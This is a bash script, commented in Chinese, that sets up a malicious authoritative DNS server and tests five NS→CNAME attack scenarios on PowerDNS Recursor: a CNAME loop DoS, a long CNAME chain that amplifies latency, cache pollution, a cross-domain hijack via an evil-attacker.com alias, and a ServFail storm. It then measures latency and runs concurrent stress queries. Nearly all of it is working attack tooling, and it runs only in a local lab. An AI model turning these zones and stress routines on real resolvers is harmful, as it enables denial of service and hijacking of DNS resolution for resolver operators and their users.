#!/usr/bin/env bash
set -euo pipefail

# ═══════════════════════════════════════════════════════════════════════
#  PowerDNS Recursor NS→CNAME 攻击场景系统验证
#
#  基于 RFC 2181 §10.3 违规缺陷，构造 5 类攻击场景：
#
#  场景1: CNAME 循环 DoS         — NS→CNAME→CNAME→...→循环，耗尽解析资源
#  场景2: 解析延迟放大           — NS→CNAME 迫使额外查询，放大 RTT ×N
#  场景3: 缓存污染面扩大         — NS→CNAME 注入额外缓存条目，扩大攻击面
#  场景4: 跨域 CNAME 劫持        — NS→CNAME 指向外部域，劫持解析路径
#  场景5: CNAME→NX ServFail 风暴 — NS→CNAME 目标不存在，引发 ServFail 泛滥
# ═══════════════════════════════════════════════════════════════════════

WORKDIR=/workspace/output/pdns-attack-scenarios
mkdir -p "$WORKDIR"

PDNS_BIN=/workspace/output/pdns-recursor-binary-baseline
PDNS_INSTALL=/workspace/output/pdns-install-baseline
export LD_LIBRARY_PATH="$PDNS_INSTALL/lib:${LD_LIBRARY_PATH:-}"

echo "═══════════════════════════════════════════════════════════"
echo "  PowerDNS Recursor NS→CNAME 攻击场景系统验证"
echo "═══════════════════════════════════════════════════════════"

# ─── Install dependencies ────────────────────────────────────────────
apt-get update -qq 2>/dev/null
apt-get install -y --no-install-recommends \
  python3 dnsutils procps bc \
  liblua5.3-0 libboost-context1.74.0 libboost-system1.74.0 \
  libboost-filesystem1.74.0 libboost-program-options1.74.0 \
  libboost-regex1.74.0 libprotobuf23 libsodium23 libfstrm0 \
  libcurl4 libyaml-cpp0.7 libsystemd0 \
  2>&1 | tail -3

$PDNS_BIN --version 2>&1 | head -1
mkdir -p /var/run/pdns-recursor 2>/dev/null || true
pkill -f pdns_recursor 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════════════════════════
#  恶意权威服务器 — 支持 5 类攻击场景
# ═══════════════════════════════════════════════════════════════════════
cat > "$WORKDIR/malicious_auth.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Malicious authoritative DNS server for NS→CNAME attack scenarios.
Supports 5 attack scenarios plus control zone.
"""
import socket, struct, time, threading, sys, json, os

LOG_FILE = '/workspace/output/pdns-attack-scenarios/auth_queries.jsonl'

def dns_name_encode(name):
    r = b''
    for p in name.rstrip('.').split('.'):
        r += bytes([len(p)]) + p.encode()
    return r + b'\x00'

def dns_name_decode(data, offset):
    parts = []; jumped = False; max_off = offset
    while offset < len(data):
        l = data[offset]
        if l == 0:
            offset += 1
            if not jumped: max_off = offset
            break
        if (l & 0xC0) == 0xC0:
            if not jumped: max_off = offset + 2
            offset = struct.unpack('!H', data[offset:offset+2])[0] & 0x3FFF
            jumped = True; continue
        offset += 1
        parts.append(data[offset:offset+l].decode())
        offset += l
    return '.'.join(parts), max_off if jumped else offset

T_A=1; T_NS=2; T_CNAME=5; T_SOA=6; CL_IN=1

def rr(n, t, c, ttl, rd):
    return dns_name_encode(n) + struct.pack('!HHI', t, c, ttl) + struct.pack('!H', len(rd)) + rd

# ─── Attack Scenario Zones ───────────────────────────────────────────
# 场景1: CNAME 循环 DoS
# ns1.loop1.com → a.loop1.com → b.loop1.com → ns1.loop1.com (循环)
ZONE_LOOP = {
    'name': 'loop1.com.',
    'soa': ('ns1.loop1.com.', 'admin.loop1.com.', 1, 3600, 900, 604800, 86400),
    'ns': ['ns1.loop1.com.'],
    'recs': {
        'ns1.loop1.com.':  [('CNAME', 'a.loop1.com.', 60)],
        'a.loop1.com.':    [('CNAME', 'b.loop1.com.', 60)],
        'b.loop1.com.':    [('CNAME', 'ns1.loop1.com.', 60)],  # ← 循环！
        'www.loop1.com.':  [('A', '10.0.1.2', 300)],
    }
}

# 场景2: 解析延迟放大 — 10 级 CNAME 链
# ns1.chain2.com → c1 → c2 → ... → c9 → real (10 次额外查询)
ZONE_CHAIN = {
    'name': 'chain2.com.',
    'soa': ('ns1.chain2.com.', 'admin.chain2.com.', 1, 3600, 900, 604800, 86400),
    'ns': ['ns1.chain2.com.'],
    'recs': {}
}
ZONE_CHAIN['recs']['ns1.chain2.com.'] = [('CNAME', 'c1.chain2.com.', 60)]
for i in range(1, 20):
    cur = f'c{i}.chain2.com.'
    nxt = f'c{i+1}.chain2.com.' if i < 19 else 'final.chain2.com.'
    ZONE_CHAIN['recs'][cur] = [('CNAME', nxt, 60)]
ZONE_CHAIN['recs']['final.chain2.com.'] = [('A', '10.0.2.1', 300)]
ZONE_CHAIN['recs']['www.chain2.com.'] = [('A', '10.0.2.2', 300)]

# 场景3: 缓存污染面扩大 — NS→CNAME 创建多个可污染缓存条目
ZONE_CACHE = {
    'name': 'cache3.com.',
    'soa': ('ns1.cache3.com.', 'admin.cache3.com.', 1, 3600, 900, 604800, 86400),
    'ns': ['ns1.cache3.com.'],
    'recs': {
        'ns1.cache3.com.':   [('CNAME', 'alias1.cache3.com.', 300)],
        'alias1.cache3.com.': [('CNAME', 'alias2.cache3.com.', 300)],
        'alias2.cache3.com.': [('CNAME', 'alias3.cache3.com.', 300)],
        'alias3.cache3.com.': [('A', '10.0.3.1', 300)],
        'www.cache3.com.':   [('A', '10.0.3.2', 300)],
    }
}

# 场景4: 跨域 CNAME 劫持 — NS→CNAME 指向外部域
# 攻击者控制 victim.com 的权威服务器，让 NS 指向 evil.com 的 CNAME
# 这样解析器会去查 evil.com，攻击者可以在那里注入恶意响应
ZONE_CROSS = {
    'name': 'cross4.com.',
    'soa': ('ns1.cross4.com.', 'admin.cross4.com.', 1, 3600, 900, 604800, 86400),
    'ns': ['ns1.cross4.com.'],
    'recs': {
        'ns1.cross4.com.':  [('CNAME', 'hijack.evil-attacker.com.', 60)],  # 指向攻击者域
        'www.cross4.com.':  [('A', '10.0.4.2', 300)],
    }
}

# 场景5: CNAME→NX ServFail 风暴
ZONE_NX = {
    'name': 'nx5.com.',
    'soa': ('ns1.nx5.com.', 'admin.nx5.com.', 1, 3600, 900, 604800, 86400),
    'ns': ['ns1.nx5.com.'],
    'recs': {
        'ns1.nx5.com.':  [('CNAME', 'nonexistent-target.nx5.com.', 60)],  # 目标不存在
        # 故意不提供 nonexistent-target.nx5.com. 的记录 → NXDOMAIN
        'www.nx5.com.':  [('A', '10.0.5.2', 300)],
    }
}

# 控制区域
ZONE_CTRL = {
    'name': 'ctrl.com.',
    'soa': ('ns1.ctrl.com.', 'admin.ctrl.com.', 1, 3600, 900, 604800, 86400),
    'ns': ['ns1.ctrl.com.'],
    'recs': {
        'ns1.ctrl.com.': [('A', '10.0.0.1', 300)],
        'www.ctrl.com.': [('A', '10.0.0.2', 300)],
    }
}

ZONES = {
    'loop1.com.':  ZONE_LOOP,
    'chain2.com.': ZONE_CHAIN,
    'cache3.com.': ZONE_CACHE,
    'cross4.com.': ZONE_CROSS,
    'nx5.com.':    ZONE_NX,
    'ctrl.com.':   ZONE_CTRL,
}

# Query tracking
all_queries = []
qlock = threading.Lock()
query_counter = {'total': 0}

def build_resp(data, qname, qtype, zone):
    txn = struct.unpack('!H', data[:2])[0]
    an = 0; ns_ = 0; ar = 0
    ans_rr = b''; auth_rr = b''; add_rr = b''

    origin = zone['name']
    soa_m, soa_r, ser, ref, ret, exp, min_ = zone['soa']
    soa_rd = dns_name_encode(soa_m) + dns_name_encode(soa_r) + struct.pack('!IIIII', ser, ref, ret, exp, min_)
    auth_rr += rr(origin, T_SOA, CL_IN, min_, soa_rd); ns_ += 1
    for ns_t in zone['ns']:
        auth_rr += rr(origin, T_NS, CL_IN, 3600, dns_name_encode(ns_t)); ns_ += 1

    ql = qname.lower().rstrip('.') + '.'
    if ql in zone['recs']:
        for rt, rv, rtl in zone['recs'][ql]:
            if rt == 'A' and qtype == T_A:
                ans_rr += rr(qname, T_A, CL_IN, rtl, socket.inet_aton(rv)); an += 1
            elif rt == 'CNAME':
                ans_rr += rr(qname, T_CNAME, CL_IN, rtl, dns_name_encode(rv)); an += 1
                if qtype == T_A:
                    target = rv.lower().rstrip('.') + '.'
                    visited = set()
                    depth = 0
                    while target in zone['recs'] and target not in visited and depth < 30:
                        visited.add(target); depth += 1
                        recs = zone['recs'][target]
                        if recs[0][0] == 'CNAME':
                            ans_rr += rr(target.rstrip('.'), T_CNAME, CL_IN, recs[0][2], dns_name_encode(recs[0][1])); an += 1
                            target = recs[0][1].lower().rstrip('.') + '.'
                        elif recs[0][0] == 'A':
                            ans_rr += rr(target.rstrip('.'), T_A, CL_IN, recs[0][2], socket.inet_aton(recs[0][1])); an += 1; break
                        else: break
                    # If loop detected or target not found, just stop
            elif rt == 'NS' and qtype == T_NS:
                ans_rr += rr(qname, T_NS, CL_IN, rtl, dns_name_encode(rv)); an += 1
    elif ql == origin.lower():
        if qtype == T_NS:
            for ns_t in zone['ns']:
                ans_rr += rr(origin, T_NS, CL_IN, 3600, dns_name_encode(ns_t)); an += 1
        elif qtype == T_SOA:
            ans_rr += rr(origin, T_SOA, CL_IN, min_, soa_rd); an += 1

    # Glue
    for ns_t in zone['ns']:
        nl = ns_t.lower().rstrip('.') + '.'
        if nl in zone['recs']:
            for rt, rv, rtl in zone['recs'][nl]:
                if rt == 'A':
                    add_rr += rr(ns_t, T_A, CL_IN, rtl, socket.inet_aton(rv)); ar += 1
                elif rt == 'CNAME':
                    add_rr += rr(ns_t, T_CNAME, CL_IN, rtl, dns_name_encode(rv)); ar += 1

    hdr = struct.pack('!HHHHHH', txn, 0x8400, 1, an, ns_, ar)
    return hdr + data[12:] + ans_rr + auth_rr + add_rr

def handle(data, addr, sock):
    global all_queries
    try:
        qn, qo = dns_name_decode(data, 12)
        qt = struct.unpack('!H', data[qo:qo+2])[0]
        ts = time.time()

        mz = None; zn = 'UNKNOWN'
        for zname, zd in ZONES.items():
            if qn.lower().endswith(zname.rstrip('.')):
                mz = zd; zn = zname; break

        with qlock:
            query_counter['total'] += 1
            qlog = {'n': query_counter['total'], 'qname': qn, 'qtype': qt, 'zone': zn, 'ts': ts, 'found': mz is not None}
            all_queries.append(qlog)

        if mz:
            resp = build_resp(data, qn, qt, mz)
            sock.sendto(resp, addr)
        else:
            txn = struct.unpack('!H', data[:2])[0]
            sock.sendto(struct.pack('!HHHHHH', txn, 0x8403, 1, 0, 0, 0) + data[12:], addr)
    except: pass

def serve(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', port))
    print(f'[AUTH] Listening on 127.0.0.1:{port}', flush=True)
    while True:
        try:
            d, a = s.recvfrom(4096)
            handle(d, a, s)
        except: pass

def save_log():
    """Periodically save query log."""
    while True:
        time.sleep(5)
        with qlock:
            if all_queries:
                with open(LOG_FILE, 'w') as f:
                    for q in all_queries:
                        f.write(json.dumps(q) + '\n')

if __name__ == '__main__':
    threading.Thread(target=serve, args=(10053,), daemon=True).start()
    threading.Thread(target=save_log, daemon=True).start()
    print('[AUTH] Ready — 6 zones loaded', flush=True)
    while True:
        time.sleep(1)
PYEOF

# ─── Start malicious auth server ────────────────────────────────────
python3 "$WORKDIR/malicious_auth.py" > "$WORKDIR/auth_server.log" 2>&1 &
AUTH_PID=$!
sleep 1
echo "Auth server started (PID $AUTH_PID)"

# ─── Start PowerDNS Recursor ────────────────────────────────────────
timeout 180 "$PDNS_BIN" \
  --config-dir=/tmp \
  --daemon=no \
  --local-port=5357 \
  --local-address=127.0.0.1 \
  --allow-from=0.0.0.0/0 \
  --dont-query= \
  --forward-zones="loop1.com=127.0.0.1:10053,chain2.com=127.0.0.1:10053,cache3.com=127.0.0.1:10053,cross4.com=127.0.0.1:10053,nx5.com=127.0.0.1:10053,ctrl.com=127.0.0.1:10053" \
  2>&1 | tee "$WORKDIR/recursor.log" &
PDNS_PID=$!
sleep 4

if ! kill -0 $PDNS_PID 2>/dev/null; then
    echo "FATAL: Recursor failed"; tail -15 "$WORKDIR/recursor.log"
    kill $AUTH_PID 2>/dev/null || true; exit 1
fi
echo "Recursor started (PID $PDNS_PID)"

REC=127.0.0.1
RPORT=5357

# ═══════════════════════════════════════════════════════════════════════
#  高精度测量脚本
# ═══════════════════════════════════════════════════════════════════════
cat > "$WORKDIR/measure_attacks.py" << 'PYEOF'
#!/usr/bin/env python3
"""Comprehensive NS→CNAME attack scenario measurements."""
import socket, struct, time, json, sys, os, concurrent.futures

def dns_name_encode(name):
    r = b''
    for p in name.rstrip('.').split('.'):
        r += bytes([len(p)]) + p.encode()
    return r + b'\x00'

def build_query(name, qtype=1, rd=1):
    import random
    txn = random.randint(1, 65535)
    flags = 0x0100 if rd else 0x0000
    return struct.pack('!HHHHHH', txn, flags, 1, 0, 0, 0) + \
           dns_name_encode(name) + struct.pack('!HH', qtype, 1), txn

def query(name, server, port, qtype=1, timeout=5):
    data, txn = build_query(name, qtype)
    t0 = time.perf_counter()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(data, (server, port))
        resp, _ = s.recvfrom(4096)
        dt = time.perf_counter() - t0
        rc = struct.unpack('!H', resp[2:4])[0] & 0xF
        an = struct.unpack('!H', resp[6:8])[0]
        # Count CNAME records in answer
        cname_count = 0
        ancount = struct.unpack('!H', resp[6:8])[0]
        offset = 12
        # Skip question
        _, offset = skip_name(resp, offset)
        offset += 4  # QTYPE + QCLASS
        for _ in range(ancount):
            _, offset = skip_name(resp, offset)
            rtype = struct.unpack('!H', resp[offset:offset+2])[0]
            rdlen = struct.unpack('!H', resp[offset+8:offset+10])[0]
            if rtype == 5:  # CNAME
                cname_count += 1
            offset += 10 + rdlen
        return {'ok': True, 'lat_ms': dt*1000, 'rc': rc, 'ans': an, 'cnames': cname_count}
    except socket.timeout:
        return {'ok': False, 'error': 'timeout', 'lat_ms': (time.perf_counter()-t0)*1000}
    except Exception as e:
        return {'ok': False, 'error': str(e), 'lat_ms': (time.perf_counter()-t0)*1000}
    finally:
        try: s.close()
        except: pass

def skip_name(data, offset):
    while offset < len(data):
        l = data[offset]
        if l == 0: return None, offset + 1
        if (l & 0xC0) == 0xC0: return None, offset + 2
        offset += 1 + l
    return None, offset

def bench(label, name, server, port, qtype=1, count=30, timeout=3):
    print(f"\n  {label}")
    results = []
    for i in range(count):
        r = query(name, server, port, qtype, timeout)
        results.append(r)
        if (i+1) % 10 == 0 or not r.get('ok'):
            st = "✓" if r.get('ok') else f"✗{r.get('error','?')}"
            print(f"    [{i+1:3d}/{count}] {st} lat={r.get('lat_ms',0):.2f}ms ans={r.get('ans','?')} cname={r.get('cnames','?')} rc={r.get('rc','?')}")
        time.sleep(0.03)

    lats = [r['lat_ms'] for r in results if r.get('ok')]
    fails = sum(1 for r in results if not r.get('ok'))
    sf = sum(1 for r in results if r.get('ok') and r.get('rc') == 2)
    timeouts = sum(1 for r in results if r.get('error') == 'timeout')
    avg_cnames = 0
    if lats:
        avg_cnames = sum(r.get('cnames',0) for r in results if r.get('ok')) / len(lats)

    s = {
        'label': label, 'total': count, 'successes': len(lats),
        'failures': fails, 'servfails': sf, 'timeouts': timeouts,
        'avg_ms': sum(lats)/len(lats) if lats else 0,
        'max_ms': max(lats) if lats else 0,
        'p95_ms': sorted(lats)[int(len(lats)*0.95)] if len(lats) >= 2 else 0,
        'p99_ms': sorted(lats)[int(len(lats)*0.99)] if len(lats) >= 2 else 0,
        'avg_cnames': avg_cnames,
    }
    print(f"    → {len(lats)}/{count} OK, {fails} fail, {sf} ServFail, {timeouts} timeout")
    if lats:
        print(f"    → avg={s['avg_ms']:.2f}ms p95={s['p95_ms']:.2f}ms p99={s['p99_ms']:.2f}ms max={s['max_ms']:.2f}ms cnames_avg={avg_cnames:.1f}")
    return s

S = '127.0.0.1'
P = 5357
all_stats = []

print("\n" + "="*70)
print("  ATTACK SCENARIO VERIFICATION")
print("="*70)

# ═══════════════════════════════════════════════════════════════════════
#  场景 0: 基线 (控制组)
# ═══════════════════════════════════════════════════════════════════════
print("\n\n  ─── Scenario 0: Baseline (NS→A, correct) ───")
s0 = bench("S0: ctrl.com A (baseline)", "www.ctrl.com", S, P, count=30)
s0['scenario'] = 'baseline'
all_stats.append(s0)

# ═══════════════════════════════════════════════════════════════════════
#  场景 1: CNAME 循环 DoS
# ═══════════════════════════════════════════════════════════════════════
print("\n\n  ─── Scenario 1: CNAME Loop DoS ───")
print("  Attack: NS→CNAME→CNAME→NS (3-way loop)")
print("  Impact: Resolver must detect & break loop, consuming CPU/state")

s1a = bench("S1a: loop1.com NS", "loop1.com", S, P, qtype=2, count=20)
s1b = bench("S1b: ns1.loop1.com A (hits CNAME loop)", "ns1.loop1.com", S, P, count=20)
s1c = bench("S1c: www.loop1.com A", "www.loop1.com", S, P, count=20)
for s in [s1a, s1b, s1c]: s['scenario'] = 'CNAME_loop'; all_stats.append(s)

# ═══════════════════════════════════════════════════════════════════════
#  场景 2: 解析延迟放大 (CNAME 链深度)
# ═══════════════════════════════════════════════════════════════════════
print("\n\n  ─── Scenario 2: Resolution Delay Amplification ───")
print("  Attack: NS→CNAME→CNAME→...×19→A (19-level chain)")
print("  Impact: Each CNAME hop = extra query, latency multiplied")

s2a = bench("S2a: chain2.com NS", "chain2.com", S, P, qtype=2, count=20)
s2b = bench("S2b: ns1.chain2.com A (follows 19 CNAMEs)", "ns1.chain2.com", S, P, count=20)
s2c = bench("S2c: www.chain2.com A", "www.chain2.com", S, P, count=20)
for s in [s2a, s2b, s2c]: s['scenario'] = 'delay_amplification'; all_stats.append(s)

# ═══════════════════════════════════════════════════════════════════════
#  场景 3: 缓存污染面扩大
# ═══════════════════════════════════════════════════════════════════════
print("\n\n  ─── Scenario 3: Cache Pollution Surface Expansion ───")
print("  Attack: NS→CNAME→CNAME→CNAME→A (creates 3+ extra cache entries)")
print("  Impact: Each CNAME record gets cached separately, expanding attack surface")

# First, clear cache by querying different names
s3a = bench("S3a: cache3.com NS", "cache3.com", S, P, qtype=2, count=10)
s3b = bench("S3b: ns1.cache3.com A (creates CNAME chain cache)", "ns1.cache3.com", S, P, count=10)
s3c = bench("S3c: www.cache3.com A", "www.cache3.com", S, P, count=10)
# Now verify cached CNAME entries
s3d = bench("S3d: alias1.cache3.com A (cached from CNAME chain)", "alias1.cache3.com", S, P, count=10)
s3e = bench("S3e: alias2.cache3.com A (cached from CNAME chain)", "alias2.cache3.com", S, P, count=10)
for s in [s3a, s3b, s3c, s3d, s3e]: s['scenario'] = 'cache_pollution'; all_stats.append(s)

# ═══════════════════════════════════════════════════════════════════════
#  场景 4: 跨域 CNAME 劫持
# ═══════════════════════════════════════════════════════════════════════
print("\n\n  ─── Scenario 4: Cross-Domain CNAME Hijack ───")
print("  Attack: NS→CNAME points to external domain (evil-attacker.com)")
print("  Impact: Resolver must query external domain for NS resolution")
print("          Attacker can poison the CNAME target's response")

s4a = bench("S4a: cross4.com NS", "cross4.com", S, P, qtype=2, count=15)
s4b = bench("S4b: ns1.cross4.com A (CNAME to external domain)", "ns1.cross4.com", S, P, count=15)
s4c = bench("S4c: www.cross4.com A", "www.cross4.com", S, P, count=15)
for s in [s4a, s4b, s4c]: s['scenario'] = 'cross_domain_hijack'; all_stats.append(s)

# ═══════════════════════════════════════════════════════════════════════
#  场景 5: CNAME→NX ServFail 风暴
# ═══════════════════════════════════════════════════════════════════════
print("\n\n  ─── Scenario 5: CNAME→NXDOMAIN ServFail Storm ───")
print("  Attack: NS→CNAME where CNAME target doesn't exist")
print("  Impact: Resolver follows CNAME, finds NXDOMAIN → ServFail")
print("          Repeated queries cause ServFail storm")

s5a = bench("S5a: nx5.com NS", "nx5.com", S, P, qtype=2, count=20)
s5b = bench("S5b: ns1.nx5.com A (CNAME→NXDOMAIN)", "ns1.nx5.com", S, P, count=20)
s5c = bench("S5c: www.nx5.com A (may also fail)", "www.nx5.com", S, P, count=20)
for s in [s5a, s5b, s5c]: s['scenario'] = 'servfail_storm'; all_stats.append(s)

# ═══════════════════════════════════════════════════════════════════════
#  Stress Test: 并发攻击
# ═══════════════════════════════════════════════════════════════════════
print("\n\n  ─── Stress Test: Concurrent Attack Queries ───")

def stress_test(label, qname, server, port, total=100, workers=20):
    print(f"\n  Stress: {label} ({total} queries, {workers} concurrent)")
    lats = []; fails = 0; sf = 0; to = 0
    def do_one(_):
        r = query(qname, server, port, 1, timeout=5)
        if r.get('ok'):
            return r['lat_ms'], r.get('rc', 0)
        else:
            return None, -1

    t_start = time.perf_counter()
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        results = list(ex.map(do_one, range(total)))
    t_total = time.perf_counter() - t_start

    for lat, rc in results:
        if lat is not None:
            lats.append(lat)
            if rc == 2: sf += 1
        else:
            fails += 1
            if rc == -1: to += 1

    qps = total / t_total if t_total > 0 else 0
    stat = {
        'label': label, 'scenario': 'stress',
        'total': total, 'successes': len(lats), 'failures': fails,
        'servfails': sf, 'timeouts': to,
        'qps': round(qps, 1),
        'total_time_ms': t_total * 1000,
        'avg_ms': sum(lats)/len(lats) if lats else 0,
        'max_ms': max(lats) if lats else 0,
    }
    all_stats.append(stat)
    print(f"    {len(lats)}/{total} OK, {fails} fail, {sf} ServFail, {to} timeout")
    print(f"    QPS: {qps:.1f}, Total: {t_total*1000:.0f}ms, avg={stat['avg_ms']:.2f}ms, max={stat['max_ms']:.2f}ms")
    return stat

st_ctrl = stress_test("STRESS: ctrl.com", "www.ctrl.com", S, P)
st_loop = stress_test("STRESS: loop1.com", "www.loop1.com", S, P)
st_chain = stress_test("STRESS: chain2.com", "www.chain2.com", S, P)
st_nx = stress_test("STRESS: nx5.com", "www.nx5.com", S, P)

# ═══════════════════════════════════════════════════════════════════════
#  Summary Report
# ═══════════════════════════════════════════════════════════════════════
print("\n\n" + "="*70)
print("  COMPREHENSIVE ATTACK SCENARIO REPORT")
print("="*70)

# Group by scenario
scenarios = {}
for s in all_stats:
    sc = s.get('scenario', 'unknown')
    if sc not in scenarios: scenarios[sc] = []
    scenarios[sc].append(s)

print(f"\n  {'Scenario':<35s} {'Avg ms':>8s} {'P95 ms':>8s} {'P99 ms':>8s} {'Fail':>5s} {'SF':>4s} {'TO':>4s}")
print(f"  {'-'*35} {'-'*8} {'-'*8} {'-'*8} {'-'*5} {'-'*4} {'-'*4}")

for sc_name, sc_stats in scenarios.items():
    for s in sc_stats:
        label = s['label'][:35]
        p95 = s.get('p95_ms', 0) or 0
        p99 = s.get('p99_ms', 0) or 0
        print(f"  {label:<35s} {s.get('avg_ms',0):>8.2f} {p95:>8.2f} {p99:>8.2f} {s.get('failures',0):>5d} {s.get('servfails',0):>4d} {s.get('timeouts',0):>4d}")

# Key comparisons
ctrl_stats = [s for s in all_stats if s.get('scenario') == 'baseline']
ctrl_avg = ctrl_stats[0]['avg_ms'] if ctrl_stats else 0

print(f"\n\n  ─── Attack Impact Ratios (vs Baseline avg={ctrl_avg:.2f}ms) ───")
for sc_name in ['CNAME_loop', 'delay_amplification', 'cache_pollution', 'cross_domain_hijack', 'servfail_storm']:
    sc_stats = scenarios.get(sc_name, [])
    for s in sc_stats:
        if s.get('avg_ms', 0) > 0 and ctrl_avg > 0:
            ratio = s['avg_ms'] / ctrl_avg
            marker = "⚠" if ratio > 1.3 else ("△" if ratio > 1.1 else "✓")
            print(f"  {marker} {s['label'][:40]:<40s} {ratio:.2f}x")

# Stress comparison
print(f"\n  ─── Stress Test Comparison ───")
print(f"  {'Zone':<25s} {'QPS':>8s} {'Total ms':>10s} {'Avg ms':>8s} {'ServFail':>10s}")
print(f"  {'-'*25} {'-'*8} {'-'*10} {'-'*8} {'-'*10}")
for s in [st_ctrl, st_loop, st_chain, st_nx]:
    print(f"  {s['label'][:25]:<25s} {s.get('qps',0):>8.1f} {s.get('total_time_ms',0):>10.0f} {s.get('avg_ms',0):>8.2f} {s.get('servfails',0):>10d}")

# Save all results
with open('/workspace/output/pdns-attack-scenarios/all_results.json', 'w') as f:
    json.dump(all_stats, f, indent=2)

print(f"\n\n  All results saved to /workspace/output/pdns-attack-scenarios/all_results.json")
PYEOF

echo ""
echo "=== Running comprehensive attack scenario tests ==="
python3 "$WORKDIR/measure_attacks.py" 2>&1 | tee "$WORKDIR/attack_output.log"

# ─── Capture recursor log ──────────────────────────────────────────
echo ""
echo "=== Recursor log (relevant entries) ==="
grep -i 'CNAME\|NS.*alias\|loop\|ServFail\|error\|timeout\|warn\|bogus\|refuse' "$WORKDIR/recursor.log" 2>/dev/null | tail -25 || echo "(none)"

# ─── Resource impact ──────────────────────────────────────────────
echo ""
echo "=== Resource usage after all attacks ==="
PDNS_PID_NUM=$(pgrep -f pdns_recursor | head -1)
if [ -n "$PDNS_PID_NUM" ]; then
    cat /proc/$PDNS_PID_NUM/status 2>/dev/null | grep -E 'VmRSS|VmSize|Threads|FDSize' || echo "(unavailable)"
    echo "File descriptors: $(ls /proc/$PDNS_PID_NUM/fd 2>/dev/null | wc -l)"
fi

# ─── Auth server query count ──────────────────────────────────────
echo ""
echo "=== Authoritative server query log summary ==="
if [ -f "$WORKDIR/auth_queries.jsonl" ]; then
    TOTAL_QUERIES=$(wc -l < "$WORKDIR/auth_queries.jsonl")
    echo "Total queries received by auth server: $TOTAL_QUERIES"
    echo "Per-zone query distribution:"
    python3 -c "
import json
from collections import Counter
queries = []
with open('$WORKDIR/auth_queries.jsonl') as f:
    for line in f:
        queries.append(json.loads(line))
zones = Counter(q['zone'] for q in queries)
for z, c in zones.most_common():
    print(f'  {z}: {c} queries')
print(f'\nTotal: {len(queries)} queries')
# Count how many are NS/CNAME related
ns_queries = sum(1 for q in queries if q.get('qtype') == 2)
cname_lookups = sum(1 for q in queries if 'ns1' in q.get('qname','') or 'alias' in q.get('qname','') or 'c1' in q.get('qname',''))
print(f'NS queries: {ns_queries}')
print(f'CNAME-related lookups: {cname_lookups}')
" 2>/dev/null || echo "(analysis failed)"
fi

# ─── Cleanup ─────────────────────────────────────────────────────────
echo ""
echo "=== Cleanup ==="
kill $PDNS_PID 2>/dev/null || true
kill $AUTH_PID 2>/dev/null || true
wait 2>/dev/null || true

echo ""
echo "Done. All data in $WORKDIR/"
